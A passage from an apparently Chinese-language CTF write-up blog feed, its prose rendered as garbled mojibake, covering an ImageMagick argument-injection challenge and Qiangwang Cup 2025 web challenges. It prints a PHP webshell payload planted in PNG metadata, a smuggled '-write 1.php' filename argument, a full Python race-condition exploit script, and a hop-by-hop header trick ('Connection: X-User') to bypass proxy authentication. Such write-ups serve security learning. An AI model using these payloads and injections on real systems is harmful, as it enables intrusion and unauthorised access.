ä¸ºä»–ä¼šæŠŠ;ç­‰å¸¸ç”¨çš„æ‹¼æ¥å­—ç¬¦ä¹Ÿå½“ä½œå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><p>é‚£ä¹ˆæˆ‘å°±å¼€å§‹å¯»æ‰¾å…¶ä»–åœ°æ–¹çš„é—®é¢˜ï¼Œè€ƒè™‘exiftoolä¼šä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜</p><p>äºæ˜¯æˆ‘æ‰¾åˆ°CVE-2021-22204  å…è®¸æ”»å‡»è€…é€šè¿‡æ¶æ„æ„é€ çš„å›¾åƒæ–‡ä»¶å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“ ExifTool ç‰ˆæœ¬ 7.44 è‡³ 12.23</p><p>å°è¯•å¤ç°äº†ä¸€ä¸‹ä¹ŸæˆåŠŸäº†</p><p><img src="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/image-20251027225237050.png" alt="image-20251027225237050"></p><p>æ¥ä¸‹æ¥éœ€è¦ç¡®è®¤ä¸€ä¸‹ç¯å¢ƒçš„exiftoolå‘½ä»¤çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜</p><style>.osfdxyfmwkmw{zoom:50%;}</style><img src="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥//2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/image-20251027225324510.png" class="osfdxyfmwkmw" alt="image-20251027225324510"><p>ä»–çš„dockerfileé‡Œé¢æ ¹æœ¬æ²¡æœ‰å®‰è£…exiftoolï¼Œä¹Ÿæ²¡æœ‰åˆ›å»ºstaticç›®å½•ï¼Œè¿™ä¼šå¯¼è‡´æ— æ³•æ­£å¸¸çš„æŠŠå¤„ç†åçš„æ–‡ä»¶ä¿å­˜ï¼Œä¹Ÿä¸ä¼šæ¸…ç†å…ƒæ•°æ®ï¼Œå½“ç„¶è¿™ä¸ªæ¼æ´ä¹Ÿæ²¡ç”¨äº†</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥åªèƒ½ä»åˆ«çš„æ–¹å‘æ€è€ƒäº†</p><p>æ ¹æ®é¢˜ç›®çš„æè¿°ImageMagickï¼Œæˆ‘ä»¬å°è¯•æœç´¢ä¸€ä¸‹è¿™ä¸ªç›¸å…³çš„ä¸œè¥¿ï¼Œå°±ä¸éš¾å‘ç°è¿™é‡Œå­˜åœ¨å‚æ•°æ³¨å…¥</p><p>$1å’Œ$2è™½ç„¶æ— æ³•è¿›è¡Œå‘½ä»¤æ³¨å…¥äº†ï¼Œä½†æ˜¯å¦‚æœä½ ä½¿ç”¨-è¿™æ ·çš„å­—ç¬¦ï¼Œå°±ä¼šè®©åé¢çš„å†…å®¹å˜æˆå‘½ä»¤çš„å‚æ•°äº†</p><p>ä¸‹é¢æ€è€ƒä¸€ä¸‹æˆ‘ä»¬éœ€è¦æ³¨å…¥ä»€ä¹ˆã€‚æ ¹æ®é¢˜ç›®ç»™çš„é™„ä»¶ä¸éš¾çœ‹å‡ºï¼Œflagæ˜¯rootæ‰å¯è¯»çš„ï¼Œæƒ³è¯»å–flagåªèƒ½åˆ©ç”¨å®ƒç¼–è¯‘çš„readflagå‘½ä»¤</p><p><img src="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/image-20251027225933933.png" alt="image-20251027225933933"></p><p><a href="https://book.jorianwoltjer.com/web/server-side/imagemagick#argument-injection">https://book.jorianwoltjer.com/web/server-side/imagemagick#argument-injection</a></p><p>è¿™ç¯‡æ–‡ç« æåˆ°äº†convertå‘½ä»¤å‚æ•°æ³¨å…¥æ—¶ç”¨åˆ°çš„ä¸€ä¸ªå‚æ•° -writeï¼Œä¼šå°†å›¾åƒå†™å…¥åˆ°æŒ‡å®šçš„è·¯å¾„</p><p>é‚£ä¹ˆè¿™å°±è§£å†³äº†æˆ‘ä»¬ç°åœ¨çš„é—®é¢˜ï¼Œé¦–å…ˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ–‡ä»¶ä¿å­˜çš„ä½ç½®äº†ï¼Œä¸ä¼šå› ä¸ºstaticç›®å½•ä¸å­˜åœ¨è€ŒæŠ¥é”™ï¼Œå…¶æ¬¡æ˜¯æˆ‘ä»¬å¯ä»¥è®²å›¾ç‰‡çš„å†…å®¹å†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£å°±ç›¸å½“äºå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™å…¥äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ ğŸæ¥è¯»æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯éšä¹‹è€Œæ¥çš„è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯convertå‘½ä»¤åœ¨å¤„ç†çš„æ—¶å€™ï¼Œæ–‡ä»¶å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„pngæ–‡ä»¶ï¼Œå¦åˆ™å°±ä¼šæ‹’ç»å†™å…¥ï¼Œä½†æ˜¯è¿™æ ·æˆ‘ä»¬åˆæ— æ³•ä¿è¯æˆ‘ä»¬çš„phpä»£ç çš„å®Œæ•´æ€§</p><p>è¿™æ—¶å€™æƒ³åˆ°ï¼Œshè„šæœ¬çš„ç¬¬äºŒæ¡å‘½ä»¤æ¸…é™¤äº†æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œéš¾é“å…ƒæ•°æ®æœ‰ä»€ä¹ˆé—®é¢˜å—</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">å›¾ç‰‡å…ƒæ•°æ®ï¼ˆmetadataï¼‰æ˜¯åµŒå…¥åˆ°å›¾ç‰‡æ–‡ä»¶ä¸­çš„ä¸€äº›æ ‡ç­¾ã€‚æ¯”è¾ƒåƒæ–‡ä»¶å±æ€§ï¼Œä½†æ˜¯ç§ç±»ç¹å¤šã€‚å¸¸è§çš„å‡ ç§æ ‡å‡†æœ‰ï¼š<br><br>EXIFï¼šé€šå¸¸è¢«æ•°ç ç›¸æœºåœ¨æ‹æ‘„ç…§ç‰‡æ—¶è‡ªåŠ¨æ·»åŠ ï¼Œæ¯”å¦‚ç›¸æœºå‹å·ã€é•œå¤´ã€æ›å…‰ã€å›¾ç‰‡å°ºå¯¸ç­‰ä¿¡æ¯ã€‚<br>IPTCï¼šæ¯”å¦‚å›¾ç‰‡æ ‡é¢˜ã€å…³é”®å­—ã€è¯´æ˜ã€ä½œè€…ã€ç‰ˆæƒç­‰ä¿¡æ¯ã€‚<br>XMPï¼šç”±Adobeå…¬å¸åˆ¶å®šæ ‡å‡†ï¼Œä»¥<span class="hljs-built_in">XML</span>æ ¼å¼ä¿å­˜ã€‚ç”¨PhotoShopç­‰Adobeå…¬å¸çš„è½¯ä»¶åˆ¶ä½œçš„å›¾ç‰‡é€šå¸¸ä¼šæºå¸¦è¿™ç§ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶å…ƒæ•°æ®å¹¶ä¸æ˜¯pngæ­£æ–‡çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ç±»ä¼¼äºå›¾ç‰‡çš„æ³¨é‡Šçš„ä¸œè¥¿ï¼Œå¹¶ä¸”æ˜¯ç”¨åŸå§‹çš„å¯è¯»å­—ç¬¦ä¿å­˜çš„</p><p>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æŠŠğŸå†™åˆ°å…ƒæ•°æ®é‡Œé¢ï¼Œç„¶åå†é€šè¿‡å‚æ•°æ³¨å…¥å†™åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸­ï¼Œå°±èƒ½è¯»åˆ°flagäº†</p><p>ç»™å›¾ç‰‡å†™å…ƒæ•°æ®å¯ä»¥åˆ©ç”¨exiftoolå·¥å…·,test.pngç”¨æ­£å¸¸pngå³å¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">exiftool -Comment=<span class="hljs-string">&#x27;&lt;?php system(&quot;/readflag&quot;); ?&gt;&#x27;</span> test.png -o evil.png<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ä¸Šä¼ evil.pngçš„æ—¶å€™æŒ‡å®šname&#x3D;1 -write 1.php 2</p><p>è¿™æ ·æƒ³å¿…å°±èƒ½æŠŠğŸå†™åˆ°1.phpä¸­ï¼Œè¿™é¢˜åˆ°è¿™é‡Œå°±ç»“æŸäº†</p><p>ä½†æ˜¯å¦‚æœç¯å¢ƒæ­£å¸¸çš„è¯ï¼Œexiftoolä¼šåœ¨convertå¤„ç†å®Œå›¾ç‰‡ä¹‹åï¼Œæ¸…æ¥šå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œæˆ‘ä»¬å†™çš„ğŸå°±ä¼šè¢«æ¸…æ‰ï¼Œæ‰€ä»¥éœ€è¦æ¡ä»¶ç«äº‰</p><p>å¾—åˆ°è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&quot;evil.png&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#åˆ›å»ºåˆæ³•png</span><br>    f.write(base64.b64decode(<span class="hljs-string">&quot;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQAAAAA3bvkkAAAACklEQVR4AWNgAAAAAgABc3UBGAAAAABJRU5ErkJggg==&quot;</span>))<br><br>payload = <span class="hljs-string">&quot;&lt;?php var_dump(system(&#x27;/readflag&#x27;));?&gt;&quot;</span><br><br>subprocess.check_output([<span class="hljs-string">&#x27;exiftool&#x27;</span>,<span class="hljs-string">f&quot;-comment=<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>,<span class="hljs-string">&#x27;evil.png&#x27;</span>])   <span class="hljs-comment">#å†™å…¥æ¶æ„payloadåˆ°å…ƒæ•°æ®</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writefile</span>():<br>    res = requests.post(url=url,data=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;a -write 1.php b&quot;</span>&#125;,files=&#123;<span class="hljs-string">&quot;img&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evil.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()&#125;)<br>    <span class="hljs-keyword">assert</span> res.status_code == <span class="hljs-number">200</span>,res.status_code<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readflag</span>():<br>    res2 = requests.get(url=url+<span class="hljs-string">&quot;/1.php&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res2.text)<br><br>thread1 = threading.Thread(target=writefile,args=())<br>thread2 = threading.Thread(target=readflag,args=())<br><br>thread1.start()<br>thread2.start() <span class="hljs-comment">#å¤šçº¿ç¨‹ç«äº‰</span><br><br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="/2025/10/27/m0leconctf-å‘½ä»¤å‚æ•°æ³¨å…¥/#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™é¢˜ç»™çš„ç¯å¢ƒæ—¢æ˜¯æç¤ºï¼Œä½†æ˜¯ç”±äºå®ƒçš„é…ç½®åˆå®¹æ˜“è¯¯å¯¼äººï¼Œæ€»çš„æ¥æ¥è§¦äº†ä¸€ä¸‹å‚æ•°æ³¨å…¥ï¼Œä¸ç®¡ä»€ä¹ˆæ³¨å…¥ï¼Œå…¶å®éƒ½æ˜¯åˆ©ç”¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™çš„é—­åˆç¬¦å·æˆ–è€…ä¸€äº›ç‰¹æ®Šçš„ç¬¦å·ç ´åå‘½ä»¤åŸæœ¬çš„ç»“æ„ï¼Œè®©å…¶æ‰§è¡Œä¸€äº›è¿èƒŒç›®çš„çš„æ“ä½œ</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯2025wp</title>
    <link href="/2025/10/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2025wp/"/>
    <url>/2025/10/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2025wp/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¢«è–„çº±äº†ï¼Œwebåªå‡ºäº†æœ€ç®€å•çš„ä¸‰é¢˜ï¼Œåšphpçš„æ—¶å€™æ˜¯çœŸè¢«ç»•æ™•äº†â€¦.</p><h1 id="SecretVault"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h1><p>è¿™é¢˜å®ç°äº†ä¸€ä¸ªå¯†ç æœ¬çš„åŠŸèƒ½ï¼Œgoå®ç°ä¸€ä¸ªä»£ç†ï¼Œåç«¯ç”¨python</p><p>é¦–å…ˆæ‰¾flagåœ¨å“ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> User.query.first():<br>    salt = secrets.token_bytes(<span class="hljs-number">16</span>)<br>    password = secrets.token_bytes(<span class="hljs-number">32</span>).<span class="hljs-built_in">hex</span>()<br>    password_hash = hash_password(password, salt)<br>    user = User(<br>        <span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>,<br>        username=<span class="hljs-string">&#x27;admin&#x27;</span>,<br>        password_hash=password_hash,<br>        salt=base64.b64encode(salt).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>    )<br>    db.session.add(user)<br>    db.session.commit()<br><br>    flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read().strip()<br>    flagEntry = VaultEntry(<br>        user_id=user.<span class="hljs-built_in">id</span>,<br>        label=<span class="hljs-string">&#x27;flag&#x27;</span>,<br>        login=<span class="hljs-string">&#x27;flag&#x27;</span>,<br>        password_encrypted=fernet.encrypt(flag.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        notes=<span class="hljs-string">&#x27;This is the flag entry.&#x27;</span>,<br>    )<br>    db.session.add(flagEntry)<br>    db.session.commit()<br></code></pre></td></tr></table></figure><p>flagå°±åœ¨adminçš„å¯†ç é‡Œï¼Œæ‰€ä»¥æƒ³é‚£é“flagå°±å¿…é¡»ä»¥adminç™»å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dashboard</span>():<br>    user = g.current_user<br>    entries = [<br>        &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: entry.<span class="hljs-built_in">id</span>,<br>            <span class="hljs-string">&#x27;label&#x27;</span>: entry.label,<br>            <span class="hljs-string">&#x27;login&#x27;</span>: entry.login,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: fernet.decrypt(entry.password_encrypted.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>            <span class="hljs-string">&#x27;notes&#x27;</span>: entry.notes,<br>            <span class="hljs-string">&#x27;created_at&#x27;</span>: entry.created_at,<br>        &#125;<br>        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> user.vault_entries<br>    ]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;dashboard.html&#x27;</span>, username=user.username, entries=entries)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ¥å£ä¼šå±•ç¤ºè¯¥ç”¨æˆ·çš„æ‰€æœ‰å¯†ç ï¼Œå¦‚æœæˆ‘ä»¬çš„èº«ä»½æ˜¯adminå°±å¯ä»¥è®¿é—®åˆ°flagï¼Œåˆ†æä¸€ä¸‹é‰´æƒæ–¹å¼ï¼Œæ˜¾ç„¶æ˜¯åœ¨è£…é¥°å™¨login_requiredé‡Œé¢æ ¡éªŒçš„ç”¨æˆ·èº«ä»½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_required</span>(<span class="hljs-params">view_func</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">view_func</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapped</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        uid = request.headers.get(<span class="hljs-string">&#x27;X-User&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(uid)<br>        <span class="hljs-keyword">if</span> uid == <span class="hljs-string">&#x27;anonymous&#x27;</span>:<br>            flash(<span class="hljs-string">&#x27;Please sign in first.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        <span class="hljs-keyword">try</span>:<br>            uid_int = <span class="hljs-built_in">int</span>(uid)<br>        <span class="hljs-keyword">except</span> (TypeError, ValueError):<br>            flash(<span class="hljs-string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        user = User.query.filter_by(<span class="hljs-built_in">id</span>=uid_int).first()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>            flash(<span class="hljs-string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>        g.current_user = user<br>        <span class="hljs-keyword">return</span> view_func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapped<br><br></code></pre></td></tr></table></figure><p>ä¸éš¾æ³¨æ„åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">uid = request.headers.get(<span class="hljs-string">&#x27;X-User&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>uidçš„ä»X-Userå¤´è·å–ï¼Œå¦‚æœæ²¡è·å–åˆ°å°±è®¾ç½®ä¸º0è€Œ0å°±ä»£è¡¨adminï¼Œé‚£ä¹ˆæ¼æ´ç‚¹å¾ˆæ˜æ˜¾äº†ï¼Œæ¥ä¸‹æ¥åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªåŠæ³•ï¼Œè®©åç«¯è·å–ä¸åˆ°X-User,æ˜¾ç„¶éœ€è¦ä»ä»£ç†å…¥æ‰‹,ä»£ç†è®¾ç½®X-Userçš„æ–¹å¼å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go">authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request)</span></span> &#123;<br>req.URL.Scheme = <span class="hljs-string">&quot;http&quot;</span><br>req.URL.Host = <span class="hljs-string">&quot;127.0.0.1:5000&quot;</span><br><br>uid := GetUIDFromRequest(req)<br>log.Printf(<span class="hljs-string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())<br>req.Header.Del(<span class="hljs-string">&quot;Authorization&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;X-User&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;Cookie&quot;</span>)<br><br><span class="hljs-keyword">if</span> uid == <span class="hljs-string">&quot;&quot;</span> &#123;<br>req.Header.Set(<span class="hljs-string">&quot;X-User&quot;</span>, <span class="hljs-string">&quot;anonymous&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>req.Header.Set(<span class="hljs-string">&quot;X-User&quot;</span>, uid)<br>&#125;<br>&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥æ‹·æ‰“ä¸€ä¸‹aiï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•è®©ä»£ç†ä¸è½¬å‘è¯·æ±‚å¤´åˆ°åç«¯</p><p>æœåˆ°äº†ä¸€ç¯‡2019å¹´çš„æ–‡ç« </p><p><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers?utm_source=chatgpt.com">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers?utm_source=chatgpt.com</a></p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å½“ä½ åœ¨Connectioné‡Œé¢å¡«åŠ äº†ä¸€ä¸ªè¯·æ±‚å¤´çš„åå­—ï¼Œä»£ç†å°±ä¸ä¼šæŠŠè¿™ä¸ªè¯·æ±‚å¤´è½¬å‘åˆ°åç«¯</p><p>å¦‚æœæˆ‘ä»¬Connection:X-User,é‚£ä¹ˆä»£ç†å°±ä¸ä¼šæŠŠX-Userè½¬å‘åˆ°åç«¯ï¼Œè¿™æ ·uidå°±ä¼šè¢«è®¾ç½®ä¸º0</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251021202520978-17610495279431.png" alt="image-20251021202520978"></p><h1 id="bbjv"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#bbjv" class="headerlink" title="bbjv"></a>bbjv</h1><p>ç”¨jadxåç¼–è¯‘jaråŒ…</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019163923028.png" alt="image-20251019163923028"></p><p>è·å–flagçš„é€»è¾‘å¾ˆç®€å•ï¼ŒSystem.getProperty(â€œuser.homeâ€)è·å–ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œè¿”å›ä¸»ç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶</p><p>è€Œflagåœ¨</p><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019164059019.png" alt="image-20251019164059019"></p><p>ä¸¤ç§æ€è·¯ï¼Œrceï¼ŒæŠŠflag.txtç§»åŠ¨åˆ°ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·çš„ä¸»ç›®å½•åˆ°tmp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.evaluationService.evaluate(rule);<br></code></pre></td></tr></table></figure><p>è°ƒç”¨evaluateæ‰§è¡Œç”¨æˆ·ä¼ å…¥çš„rule</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">evaluate</span><span class="hljs-params">(String expression)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.parser.parseExpression(expression, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>()).getValue(<span class="hljs-built_in">this</span>.context);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Result: &quot;</span> + String.valueOf(result);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜æ˜¾å­˜åœ¨spelè¡¨è¾¾å¼æ³¨å…¥</p><p>å…ˆå°è¯•rce</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">#&#123;<span class="hljs-built_in">T</span>(java.lang.String)&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/21/å¼ºç½‘æ¯2025wp/image-20251019165602847.png" alt="image-20251019165602847"></p><p>æµ‹è¯•äº†ä¸€ä¸‹å‘ç°æ— è®ºç”¨å•¥éƒ½ä¼šè¿”å›æ‰¾ä¸åˆ°åŒ…ï¼Œå†é˜…è¯»æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/config/SpelConfig.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpelConfig</span> &#123;<br>    <span class="hljs-meta">@Bean(&#123;&quot;systemProperties&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">systemProperties</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> System.getProperties();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&#123;&quot;restrictedEvalContext&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> EvaluationContext <span class="hljs-title function_">restrictedEvaluationContext</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;systemProperties&quot;)</span> Properties systemProperties)</span> &#123;<br>        <span class="hljs-type">SimpleEvaluationContext</span> <span class="hljs-variable">simpleContext</span> <span class="hljs-operator">=</span> 